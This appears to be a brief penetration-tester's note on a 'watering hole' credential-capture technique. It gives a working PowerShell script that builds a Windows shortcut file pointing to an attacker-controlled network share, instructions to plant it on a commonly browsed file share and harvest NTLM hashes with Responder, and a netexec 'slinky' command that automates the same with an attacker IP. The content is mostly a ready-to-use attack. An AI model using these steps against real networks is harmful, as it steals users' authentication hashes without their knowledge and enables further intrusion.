Watering hole attack
We make a file that executes a powershell script that tries to resolve, but throws a hash your way instead

```$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\10.20.30.40\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

- Put that into your PS, save the file
- Change the name of the file so that it's loaded first when navigating to a file system
- Once it's in a place that everyone goes to (watering hole), open up [[Responder]]
- Watch the hashes come in

Also a module in [[crackmapexec]] called "slinky"
`netexec smb [target IP] -d [domain] -u [user] -p [password] -M slinky -o NAME=[name of the file] SERVER=[attacker IP]`